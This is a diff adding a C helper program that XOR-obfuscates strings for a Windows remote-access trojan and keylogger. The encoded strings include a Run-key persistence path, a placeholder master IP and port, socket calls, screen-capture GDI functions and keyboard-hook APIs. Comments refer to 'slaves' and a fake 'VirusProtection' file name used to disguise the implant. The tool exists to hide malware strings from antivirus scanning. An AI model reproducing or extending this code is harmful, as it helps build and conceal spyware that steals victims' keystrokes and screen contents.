@@ -1,0 +1,206 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+#include <windows.h>
+
+typedef unsigned char uint8;
+
+typedef uint8* OUT_UCHAR;
+typedef uint8** OUT_USTRP;
+
+#define MAX_BUFFSIZE 2048
+
+extern inline uint8 xorCrypt(uint8 val, uint8 key, uint8 salt, uint8 pepper)
+{
+	return (((val ^ key) ^ salt) ^ pepper);
+}
+
+extern inline uint8 xorDecrypt(uint8 val, uint8 key, uint8 salt, uint8 pepper)
+{
+	return (((val ^ pepper) ^ salt) ^ key);
+}
+
+void translate(uint8 key, uint8 salt, uint8 pepper, char* str)
+{
+	int strLen = strlen(str);
+
+	printf(" { (uint8*)\"\\x%02X\\x%02X\\x%02X\\x%02X\", (uint8*)\"", strLen, key, salt, pepper);
+
+	int i;
+
+	for(i = 0; i != strLen; i++)
+	{
+		printf("\\x%02X", xorCrypt(str[i], key, salt, pepper));
+	}
+
+	printf("\" }, //%s\n", str);
+}
+
+void translate_v2(uint8 key, uint8 salt, uint8 pepper, char* str, int len)
+{
+	int strLen = len;
+	
+	printf(" { (uint8*)\"\\x%02X\\x%02X\\x%02X\\x%02X\", (uint8*)\"", strLen, key, salt, pepper);
+
+	int i;
+
+	for(i = 0; i != strLen; i++)
+	{
+		printf("\\x%02X", xorCrypt(str[i], key, salt, pepper));
+	}
+
+	printf("\" }, //%s\n", str);
+}
+
+void main_test(void)
+{
+	uint8 val = 'A';
+	uint8 key = 0xF0;
+	uint8 salt = 0xAC;
+	uint8 pepper = 0x4F;
+
+	printf("XOR Example:\n\t");
+	printf("Val: %c %X\n\t", val, val);
+	printf("Key: %X\n\t", key);
+	printf("Salt: %X\n\t", salt);
+	printf("Pepper: %X\n\n\t", pepper);
+
+	uint8 eval = xorCrypt(val, key, salt, pepper);
+
+	printf("Enc val: %X\n\t", eval);
+
+	uint8 dval = xorCrypt(eval, key, salt, pepper);
+
+	printf("Dec val: %c %X\n\n", dval, dval);
+}
+
+void main_randBytes(int count)
+{
+	int i;
+
+	for(i = 0; i != count; i++)
+	{
+		printf("0x%02X, 0x%02X, 0x%02X, \n", rand() % 0xFF, rand() % 0xFF, rand() % 0xFF);
+	}
+
+	exit(0);
+}
+
+int main(int argc, char* args[])
+{
+	srand(time(NULL));
+	//main_randBytes(50);
+
+	printf("Encrypt algorithm:\n\tE = (('A' ^ Key) ^ Salt) ^ Peper\n");
+	printf("Decyption algorithm:\n\tD = (((E ^ Peper) ^ Salt) ^ Key)\n\n");
+	main_test();
+
+	translate(0x58, 0xBA, 0xAE, "APPDATA"); //for getenv (AppData\Roaming\)
+	translate(0x4E, 0xCB, 0x9E, "USERPROFILE"); //for getenv (USER FOLDER)
+	translate(0xF8, 0x49, 0x0C, "cmd.exe /c del ");
+	translate(0x73, 0x4D, 0xE1, "cmd.exe /c ");
+	translate(0x7B, 0x5C, 0x57, "AppData"); //AppData
+	translate(0xFC, 0x0F, 0x7B, "Software\\Microsoft\\Windows\\CurrentVersion\\Run");
+	translate(0x54, 0x19, 0x94, "Software\\Microsoft"); //check for other slaves
+	translate(0x1C, 0x30, 0xD6, "VirusProtection"); //if this file can't be deletet then there are other slaves running, and so we exit
+	translate(0x9F, 0xB3, 0xCC, "\\Local\\Microsoft\\VirusProtection.data");
+	translate(0x85, 0x1A, 0x70, "SOME IP"); //YOU'R MASTER IP/DNS
+	translate_v2(0x68, 0x6E, 0x9C, "\x6A\xA", 2); //PORT in hex!!!::YOU'R MASTER PORT
+
+	putchar('\n');
+	translate(0xD1, 0x05, 0xD5, "Advapi32.dll");
+	translate(0x6F, 0x95, 0xE2, "RegGetValueA");
+	translate(0xE0, 0x1A, 0xB7, "RegSetKeyValueA");
+
+	putchar('\n');
+	translate(0xA6, 0x0B, 0x3B, "Ws2_32.dll");
+	translate(0xA2, 0xD5, 0x1F, "WSAStartup");
+	translate(0x9E, 0x6B, 0xC3, "WSACleanup");
+	translate(0x76, 0x8A, 0xE7, "recv");
+	translate(0xD2, 0x65, 0xFE, "send");
+	translate(0x84, 0x34, 0x12, "gethostbyname");
+
+	translate(0xC7, 0xB8, 0x34, "closesocket");
+	translate(0x1C, 0x47, 0x7E, "shutdown");
+	translate(0x20, 0x0B, 0xEF, "setsockopt");
+	translate(0xBA, 0x06, 0x06, "ioctlsocket");
+	translate(0x23, 0xFA, 0x5B, "socket");
+	translate(0xFE, 0x50, 0x12, "select");
+	translate(0x37, 0x5C, 0x6C, "htons");
+	translate(0xC3, 0xA4, 0xE4, "connect");
+	translate(0xB0, 0x82, 0x61, "__WSAFDIsSet");
+
+	putchar('\n');
+	translate(0xB0, 0x82, 0x61, "Gdi32.dll");
+	translate(0x43, 0x4C, 0xA9, "SelectObject");
+	translate(0x2C, 0x50, 0x73, "CreateCompatibleDC");
+	translate(0xC6, 0xC6, 0x51, "CreateCompatibleBitmap");
+	translate(0x7C, 0xFA, 0xBD, "SetStretchBltMode");
+	translate(0xED, 0x75, 0xB2, "StretchBlt");
+	translate(0x5E, 0x62, 0xA0, "GetDIBits");
+	translate(0x45, 0xE6, 0xF3, "DeleteObject");
+	translate(0x89, 0x57, 0xB6, "DeleteDC");
+
+	putchar('\n');
+	translate(0x80, 0xB5, 0x35, "Psapi.dll");
+	translate(0xE9, 0xA9, 0x75, "GetModuleFileNameExA");
+
+	putchar('\n');
+	translate(0x53, 0x4A, 0x38, "User32.dll");
+	translate(0x21, 0x12, 0xF7, "SetWindowsHookExA");
+	translate(0xD2, 0x91, 0xD0, "GetMessageA");
+	translate(0x47, 0x03, 0x5F, "TranslateMessage");
+	translate(0x8C, 0xF3, 0x8D, "DispatchMessageA");
+	translate(0xED, 0x83, 0x38, "GetKeyState");
+
+	translate(0x30, 0xA1, 0xE8, "CallNextHookEx");
+	translate(0x79, 0x3C, 0x06, "GetForegroundWindow");
+	translate(0xE9, 0xAA, 0xC4, "GetWindowTextA");
+
+	getchar();
+}
+
+/*
+0x81, 0x86, 0x41,
+0x29, 0xFC, 0x6F,
+0x13, 0x4C, 0x5B,
+0x78, 0x01, 0x92,
+0xD9, 0x2A, 0x74,
+0x09, 0x4F, 0xAC,
+0x3E, 0x07, 0xD7,
+0xC5, 0x23, 0xCF,
+0xEE, 0xDC, 0x1E,
+0x28, 0x91, 0xA1,
+0x4E, 0x8D, 0x7D,
+0x5E, 0x2E, 0x1A,
+0xA9, 0x84, 0xBD,
+0x18, 0x9A, 0x98,
+0x7B, 0xF6, 0xF7,
+0xD5, 0x24, 0x12,
+0xB0, 0x6D, 0x86,
+0x41, 0x44, 0xA8,
+0x3B, 0x95, 0x7A,
+0x65, 0x5C, 0xC3,
+0xA9, 0x74, 0xC9,
+0xF1, 0x84, 0x63,
+0xED, 0xD3, 0x4A,
+0xAB, 0x97, 0x09,
+0x4A, 0xE8, 0x57,
+0x28, 0x52, 0x9D,
+0xE3, 0xB7, 0x8B,
+0x95, 0xFB, 0xEC,
+0xC8, 0xEE, 0xF8,
+0xA6, 0xC1, 0x74,
+0x73, 0x21, 0xA5,
+0x8B, 0xB0, 0x5F,
+0x25, 0xFC, 0xA0,
+0xA9, 0x1C, 0x7F,
+0x14, 0x4A, 0x6E,
+0x53, 0xE0, 0x44,
+0xC1, 0x3A, 0x6A,
+0x34, 0xE5, 0xDC,
+0x4D, 0x0A, 0xDB,
+0x53, 0x4B, 0xA4,
+0xC6, 0x3D, 0x00,
+*/
